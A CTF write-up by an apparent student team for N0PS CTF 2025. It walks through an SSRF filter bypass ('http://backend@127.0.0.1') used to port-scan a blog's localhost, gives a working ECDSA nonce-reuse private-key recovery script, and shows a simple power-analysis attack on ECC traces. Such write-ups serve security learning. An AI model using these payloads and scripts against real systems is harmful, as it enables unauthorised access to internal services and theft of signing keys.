---
title: N0PS CTF 2025 - Writeup
date: 2025-05-31
categories: [CTF, Writeup]
tags: [N0PS, CTF, Web, Crypto, Reversing, Forensics, Pwn, OSINT]
description: A comprehensive write-up of the N0PS CTF 2025 by Team NOVA, sharing insights and solutions for various challenges tackled during the competition.
author: [spidey,de8u9]
---

## WebTopia

###  Blog - That Blogged Too Hard

I landed on this simple-looking blog site — nothing too fancy, just three posts with titles like:

* *"How to deal with cuckroaches?"*
* *"My guide to cook chick"*
* *"A Desolate Cry for Help"*

A normal person might just read them.
But I'm in a CTF, so naturally, I tried to break it.

```json
[
  {"id":"1","title":"How to deal with cuckroages ?","name":"oggy"},
  {"id":"2","title":"My guide to cook chick","name":"sylvester"},
  {"id":"3","title":"A Desolate Cry for Help","name":"tom_the_cat"}
]
```

---

###  JavaScript Spoils the Mystery

The frontend made it *way too easy* to see how things worked:

```js
fetch('/blog.php?blog=all')
```

&#x20;Clicking one sends:

```
/blog.php?blog=1
```

Clearly, some PHP backend is fetching blog data using that `blog` parameter. Time to mess with it.

---

###  Fuzzin’ and Breakin’

Sent in some spicy nonsense:

```
/blog.php?blog='"`{ ;$Foo}
```

And PHP screamed:

```php
Fatal error: curl_setopt(): cURL option must not contain any null bytes
```

Wait, **curl?**
This thing is making **server-side HTTP requests** to:

```php
curl_setopt($ch, CURLOPT_URL, 'backend/' . $blog);
```

This smells like **SSRF**.

---

### Confirming SSRF: The Fun Way

Tried a NoSQL-style input:

```
/blog.php?blog[$ne]=null
```

Got this gem:

```php
str_starts_with(): Argument #1 ($haystack) must be of type string, array given
```

Aha! It May be doing:

```php
if (str_starts_with($blog, "http://"))
```

Which means if the `blog` param starts with `http://`, it treats it as a **full URL** and passes it to `curl`.

Boom. We’re in SSRF town.

---

### But Then, the Filters

Tried:

```
/blog.php?blog=http://localhost/
```

And got hit with:

```
Warning: Request should only be sent to backend host.
```

Okay, so the site is *filtering* SSRF targets. Probably something like:

```php
if (!str_contains($url, 'backend')) {
  die("Warning: Request should only be sent to backend host.");
}
```

###  `/blog.php?blog=http://backend/`?

* No errors.
* But also **no output**.

Then I tried:

```
/blog.php?blog=http://backend/1
```

It returned the same content as:

```
/blog.php?blog=1
```

So the backend itself is mirroring the same data. Kinda boring, but useful confirmation.

---

### Now the Clever Bit: The \`\`\*\* Bypass\*\*

Tried:

```
/blog.php?blog=http://backend@127.0.0.1/
```

 No warning!
 SSRF request went through.
 Redirected to index page… something’s working…

---

###  Why Does `http://backend@127.0.0.1/` Work?

This is an old SSRF trick using **Basic Auth syntax** in URLs:

```plaintext
http://[username]@[host]/path
```

So `http://backend@127.0.0.1:8080/` is interpreted by the browser or curl (and PHP under the hood) as:

* `backend` = username
* `127.0.0.1:8080` = actual host

**The username is ignored** by the server if there's no password challenge.

✔ The filter sees `"backend"` in the string, so it passes
✔ But the actual request goes to `127.0.0.1:8080`

Classic SSRF bypass. You love to see it.

---

### Port-Scanning the Backyard

I hit all the classics:

```
/blog.php?blog=http://backend@127.0.0.1:5000/
/blog.php?blog=http://backend@127.0.0.1:8000/
/blog.php?blog=http://backend@127.0.0.1:1337/
```

Then:

```
/blog.php?blog=http://backend@127.0.0.1:8080/
```

🎉 Jackpot! 🎉

And staring back at me was:

```
N0PS{S5rF_1s_Th3_n3W_W4y}
```

---

### TL;DR

* Frontend calls `/blog.php?blog=all`, individual posts via ID
* Backend does:

  * `curl_setopt($ch, CURLOPT_URL, 'backend/' . $blog);`
  * Or, if it starts with `http://`, uses it as a full URL
* Localhost SSRF blocked with filter
* Tried:

  * `/blog.php?blog=http://backend/` → no output
  * `/blog.php?blog=http://backend/1` → same blog content as `/blog.php?blog=1`
* Bypassed filter with `http://backend@127.0.0.1:8080/`
* Port 8080 had the flag \`N0PS{S5rF\_1s\_Th3\_n3W\_W4y}\`

---

## CrypTopia

### Free n00psy

**Description :**  I found data left by n00psy who was analysing a security lock before getting captured. Noopsy might have been able to glitch its RNG. This [document](https://web.archive.org/web/20250505090133/https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf) was also laying around.
Can you help me recover the secret to clone a security badge and open the secure door to free n00psy.

**Hint 1** : The comms are repeating a single operation over and over again...
**Hint 2** :  Some curves are quite known, aren’t they?
**Files**  : `SignatureLog.txt` , `Secret.zip`
#### First Look
the `Secret.zip` seems to be encrypted having 2 files

![Image](/assets/images/Pasted_image_20250602180700.png)

lets try to crack it with `rockyou.txt`

![Image](/assets/images/Pasted_image_20250602180749.png)

no luck there, next we check if its a classic zip

![Image](/assets/images/Pasted_image_20250602180934.png)

it is encrypted with ZipCrypto but the compression is Deflate, so a known plaintext wont work with these files ;-;

#### Changing Focus
Since we didn't get anywhere with `Secret.zip`, lets focus on `SignatureLog.txt`

![Image](/assets/images/Pasted_image_20250602181158.png)

these seems to be [ECDSA](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm) Signatures of `Approve access for ID <id>` , lets parse them in python and analyze them

```python
raw = open("SignatureLog.txt").readlines()
data = []
for i in range(0,len(raw),3):
    id = int(raw[i].split(" ")[-1][:-3])
    r = int(raw[i+1].split(" ")[-1].strip(),16)
    s = int(raw[i+2].split(" ")[-1].strip(),16)
    data.append((id,r,s))

for (id,r,s) in data:
    for d2 in data:
        if id!=d2[0] and r!=d2[1]:
            print(id,d2[0])
            break
```

![Image](/assets/images/Pasted_image_20250602182519.png)

bamm , the `SignatureLog.txt` contains multiple signature with same `r` meaning `nonce (k)` is reused , we can use this for [nonce reuse attack](https://billatnapier.medium.com/ecdsa-signatures-are-great-but-be-carefull-of-nonce-reuse-eeba25d20ab7)

```python
import os
import sys
path = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.realpath(os.path.abspath(__file__)))))
if sys.path[1] != path:
    sys.path.insert(1, path)
from shared import solve_congruence
from Crypto.Util.number import long_to_bytes
def attack(n, m1, r1, s1, m2, r2, s2):
    """
    Recovers the nonce and private key from two messages signed using the same nonce.
    :param n: the order of the elliptic curve
    :param m1: the first message
    :param r1: the signature of the first message
    :param s1: the signature of the first message
    :param m2: the second message
    :param r2: the signature of the second message
    :param s2: the signature of the second message
    :return: generates tuples containing the possible nonce and private key
    """
    for k in solve_congruence(int(s1 - s2), int(m1 - m2), int(n)):
        for x in solve_congruence(int(r1), int(k * s1 - m1), int(n)):
            yield int(k), int(x)

import hashlib
def hash_message(m: str):
    h = hashlib.sha256(m.encode()).digest()
    return int.from_bytes(h, byteorder='big')

n = int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)
m1 = hash_message("Approve access for ID 16400215")
m2 = hash_message("Approve access for ID 16400201")
r = int("a53c9ec6c45a6d1d0347b09cb36f3bea52ac37d8e22f4d7cc344db033901bdc6", 16)
s1 = int("a2022a236027f16a5287744745699461906228baaa1124a5f5bfcd0aaeb34b43", 16)
s2 = int("43e149561f9246162d275e6a7354d53a9ce23a727c965a5fdc61c983df53bc4", 16)

key = list(attack(n, m1, r, s1, m2, r, s2))
print(long_to_bytes(key[0][1]))
```
[attack from jvdsn/crypto-attacks](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/ecc/ecdsa_nonce_reuse.py)

![Image](/assets/images/Pasted_image_20250602184128.png)

`next.txt:`
`Yay! We made it past the first step to rescue Noopsy. 
Wasn't that a good sign? But now we go to the next task when we have the time! 
The comms seem stuck with one single operation now. 
Some things add up and some don't! Remember, patience is key for rescuing Noopsy!`

loading up the `traces_ECC.npy` in numpy we see it has shape `(20, 16551)`
```python
import numpy as np
traces = np.load("traces_ECC.npy",allow_pickle=True)
print(traces.shape)
```

given the context , this is going to be a [side-channel attack](https://en.wikipedia.org/wiki/Side-channel_attack) , specifically from the `next.txt`  : `The comms seem stuck with one single operation now` and `Some things add up and some don't!` , we can infer all 20 traces of 16551 samples  are of same operation and we need to identify patterns for double-add and double-only operation , without any additional metadata it it more likely to just require `SPA (Simple Power Analysis)` attack.

basically in SPA we determine visual patterns in the power traces to differentiate double-add and double-only operations ,using that we can map double-add to a **1 bit** and double-only to a **0 bit** of the **private key** used

We can take the mean of the traces because, based on `Hint 1` and `next.txt`, we know that all traces correspond to the same operation (like signing the same message), This implies that the internal computation is identical, allowing us to average the traces to reduce noise and highlight consistent leakage patterns

```python
import numpy as np
from matplotlib import pyplot as plt

traces = np.load("traces_ECC.npy",allow_pickle=True)
print(traces.shape)

traces = np.mean(traces, axis=0)
# traces.shape is now (16551,)
plt.figure(figsize=(16, 6))
plt.plot(traces)
plt.grid(True)
# adjusted for better pattern visibility
plt.subplots_adjust(top=0.7, bottom=0.4,left=0,right=1)
plt.show()
```
![Image](/assets/images/Pasted_image_20250602190432.png)

lets Zoom in a little

![Image](/assets/images/Pasted_image_20250602190540.png)
researching only for side-channel SPA attack on ECC , we come across readings about how double-add and double-only operations different in power traces , one such example trace is 

![Image](/assets/images/Pasted_image_20250602190900.png)

comparing it to our traces plot , we can clearing see a pattern of shorter gaps between peeks (double-only) and longer gaps (double-add)
![Image](/assets/images/Pasted_image_20250602191755.png)
Now to determine the operations programmatically , we can look at the length of gaps between the power peaks, smaller gap = double-only = 0  and bigger gap = double-add = 1 , a little help from gpt goes a long way :D

```python
import numpy as np
from matplotlib import pyplot as plt
from scipy.ndimage import binary_closing
from Crypto.Util.number import bytes_to_long, long_to_bytes

threshold = 30           # threshold for detect ascend/descend
max_spike_width = 9       # samples: ignore dips shorter than this

def find_segments_with_debounce(data, threshold, max_spike_width):
    above_raw = data > threshold
    above_clean = binary_closing(above_raw, structure=np.ones(max_spike_width))
    d = np.diff(above_clean.astype(int))
    ascends = np.where(d == 1)[0] + 1
    descends = np.where(d == -1)[0] + 1
    return ascends, descends, above_raw, above_clean
  
traces = np.load("traces_ECC.npy",allow_pickle=True)
print(traces.shape)
_, num_samples = traces.shape
mean_trace = np.mean(traces, axis=0)
t = np.arange(num_samples)
asc, desc, mask_raw, mask_clean = find_segments_with_debounce(mean_trace, threshold, max_spike_width)

gaps = []
j = 0
for d in desc:
    while j < len(asc) and asc[j] <= d:
        j += 1
    if j < len(asc):
        gaps.append(asc[j] - d)
```
Plotting for debugging and parameters adjustment
![Image](/assets/images/Pasted_image_20250602193113.png)
```python
plt.figure(figsize=(10, 5))
plt.plot(t, mean_trace, label='Averaged Trace', linewidth=1.5)
plt.hlines(threshold, t[0], t[-1], linestyles='--', color='gray', label='Threshold')

# Overlay cleaned plateau segments
for start, end in zip(asc, desc):
    plt.plot(t[start:end], mean_trace[start:end], linewidth=4,
                label='Plateau' if start == asc[0] else None)

ymin, ymax = mean_trace.min(), mean_trace.max()
plt.vlines(t[asc], ymin, ymax, colors='green', linestyles=':', label='Ascend')
plt.vlines(t[desc], ymin, ymax, colors='red', linestyles=':', label='Descend')
plt.xlabel('Sample Index')
plt.ylabel('Signal Value')
plt.legend()
plt.tight_layout()
plt.show()
```

after some changing parameters and visually confirming all peaks and gaps are detected carefully
we interpret the gaps as bits for the private key 
```python
gaps = np.array(gaps)
bits= (gaps > 30).astype(int)
bits = "".join(str(b) for b in bits)
num = int(bits,2)
print("Length : ",len(bits))
print("Binary : ",bits)
print("Hex : ",hex(num))
print("Decoded : ",long_to_bytes(num))
```
![Image](/assets/images/Pasted_image_20250602193545.png)

Well that doesn't look right ;-;
after checking the binary output a bit , we see that the bits are correct but it is revered so
we reversing the binary output before decryption we get
```python
bits = "".join(str(b) for b in bits)[::-1]
```
![Image](/assets/images/Pasted_image_20250602193805.png)

Almost there!!! , well analysing the binary output manually in [CyberChef](https://gchq.github.io/CyberChef/) ,we find there has been a extra 0 bit  in the middle of the binary output , probably because our `max_spike_width` param was too low and a peak with spiked was interpreted as another gap and 1 bit and a 0 bit was missing at the start and the end, (should really improve the script but hey if it works it works!!!!)
Anyway fixing the binary string we get our final flag 
```
Binary : 0100111000110000010100000101001101111011010001100011000001010010010111110100101001010101010100110101010001011111001101000101111101010011001100010100110101010000010011000011001101011111001100110101100001000011010010000011010001001110010001110011001101111101
```
```
FLAG : N0PS{F0R_JUST_4_S1MPL3_3XCH4NG3}
```

-- **Team Nova**